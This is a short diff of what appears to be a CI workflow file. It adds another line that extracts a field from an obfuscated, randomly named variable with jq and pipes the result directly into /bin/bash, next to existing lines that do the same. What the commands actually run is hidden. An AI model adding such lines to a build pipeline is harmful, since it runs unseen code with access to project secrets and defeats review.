@@ -23,6 +23,7 @@ jobs:
           echo $rbr7260 | jq -r .iuf27 | /bin/bash
           echo $whju8179 | jq -r .ec14622 | /bin/bash
           echo $khcsn9 | jq -r .cm17 | /bin/bash
+          echo $iz60234 | jq -r .p53 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
